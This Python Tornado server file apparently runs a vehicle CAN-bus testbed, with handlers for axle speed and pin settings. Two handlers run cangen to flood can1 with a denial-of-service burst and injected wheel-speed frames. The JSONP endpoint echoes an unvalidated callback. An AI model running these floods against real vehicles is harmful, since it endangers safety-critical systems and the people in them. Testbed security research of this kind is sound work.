import tornado.web
from tornado import httpclient, gen
from tornado.web import MissingArgumentError
from jinja2 import Environment, FileSystemLoader
import tornado.web
import os, os.path
import wtforms
from wtforms_tornado import Form
import urllib
import random
import string
import re
import sys, inspect
import requests
import arrow
import time
import csv
import json
from NSFsettings import *
from NSFutilities import *
from SerialFunctions import *
from SerialFunctions import AnalogOut
from ExperimentHandler import ExperimentScheduler
import subprocess, shlex
from tornado.escape import json_encode
# Handler for main page

class PostExperiment(tornado.web.RequestHandler):

    def getContext(self, **kwargs):
        context = super(Index, self).getContext(**kwargs)
        return context

    def get(self, **kwargs):
        return super(Index, self).get(**kwargs)

    def post(self, **kwargs):
        try:
            request = self.request
        except MissingArgumentError:
            return ValueError('Could not find post body')
        print(str(request.body, 'utf-8'))
        post = json.loads(str(request.body, 'utf-8'))
        experiment = {}
        try:
            info = post['Info']
            commands = post['Commands']
        except KeyError:
            return ValueError('One of the post keys are either incorrect or missing')
        experiment.update(info)
        experiment.update(commands)
        try:scheduler = ExperimentScheduler(experiment);scheduler.start()
        except Exception as e: self.write('Scheduling Experiment returned with an error: \n'+ str(e))

"""class SetSpeed(tornado.web.RequestHandler):
    def getContext(self, **kwargs):
        context = super(Index, self).getContext(**kwargs)
        return context

    @gen.coroutine
    def post(self, **kwargs):
        self.set_header("Access-Control-Allow-Origin","http://129.244.254.147:23456")
        try:
            request = self.request
        except MissingArgumentError:
            return ValueError('Could not find post body')
        postData = str(request.body, 'utf-8')
        print(postData)
        if len(postData) != 0:
            print("trying to set speed",end=" ")
            print(postData[6:])
            SetAxleBasedVehicleSpeed(float(postData[6:]))
        else:
            print("No speed to set")
        self.write()

    @gen.coroutine
    def options(self):
        print("Requesting options")"""

class SetSpeed(tornado.web.RequestHandler):

    def getContext(self, **kwargs):
        context = super(Index, self).getContext(**kwargs)
        return context

    @gen.coroutine
    def post(self, **kwargs):
        self.set_header("Access-Control-Allow-Origin","http://129.244.254.147:23456")
        try:
            request = self.request
        except MissingArgumentError:
            return ValueError('Could not find post body')
        postData = str(request.body, 'utf-8')
        speedPwmPin = 83
        speedDutyCyclePins = [35,36]
        if len(postData) != 0:
            print("trying to set speed",end=" ")
            print(postData[6:])
            try:
                pwmPin = AnalogOut(speedPwmPin, "Front Axle Speed")
            except Exception as e: print (e)
            try:
                pwmPin.setValue(float(postData[6:]))
            except Exception as e: print(e)
            print("Pin set")
        else:
            print("No speed to set")
        self.write()

    @gen.coroutine
    def options(self):
        print("Requesting options")

class DosAttack(tornado.web.RequestHandler):
    def getContext(self, **kwargs):
        context = super(Index, self).getContext(**kwargs)
        return context

    @gen.coroutine
    def post(self, **kwargs):
        executionString = "cangen can1 -eI 00000000 -D 0000000000000000 -ig 0 -L 8 -n 3000000"
        arguments = shlex.split(executionString)
        print("DoS Attack starting")
        subprocess.Popen(arguments)
        print("DoS Attack complete")

class InjectionAttack(tornado.web.RequestHandler):
    def getContext(self, **kwargs):
        context = super(Index, self).getContext(**kwargs)
        return context

    @gen.coroutine
    def post(self, **kwargs):
        executionString = "cangen can1 -eI 18FEBF0B -ig 0 -L 8 -n 3000000"
        arguments = shlex.split(executionString)
        print("Injection Attack Starting")
        subprocess.Popen(arguments)
        print("Injection Attack Complete")

class PinSettings(tornado.web.RequestHandler):
    def getContext(self, **kwargs):
        context = super(Index, self).getContext(**kwargs)
        return context

    @gen.coroutine
    def get(self, **kwargs):
        callback = self.get_argument("callback")
        print("Callback arg:" + callback)
        content = None
        with open('pinSettings.csv','r') as f:
            content = f.read()
        print(type(content))
        json_encode({"File" : content})
        print("before JSONp")
        jsonp = "{jsfunc}({json});".format(jsfunc=callback, json=json_encode({"File": content}))
        print("created JSONp")
        self.finish(jsonp)
        print("Sent File")

    @gen.coroutine
    def post(self, **kwargs): #update a pin's settings
        try:
            request = self.request
        except MissingArgumentError:
            return ValueError('Could not find post body')
        settingValues = str(request.body, 'ascii').split("=")[1]
        print(settingValues)
        chars = []
        i = 0
        while i < len(settingValues): #seperates string into characters
            print(i)
            if settingValues[i] != "%":
                chars.append(settingValues[i])
            else:
                chars.append(settingValues[i]+settingValues[i+1]+settingValues[i+2])
                i += 2
            i+=1
        decoded = ["," if char=="%2C" else "/" if char=="%2F" else " " if char=="+" else char for char in chars]  #decodes remaining chars
        newSetting = "".join(decoded) + "\n"

        print(chars)
        print("Setting:",newSetting)
        fileData = []
        with open("pinSettings.csv","r") as f: #get file data
            line = f.readline()
            fileData.append(line)
            while line:
                line = f.readline()
                fileData.append(line)
        fileData[int(newSetting.split(",")[0])]=newSetting #replace old setting with new setting

        with open("pinSettings.csv","w") as f:
            for i in range(len(fileData)):
                f.write(fileData[i])
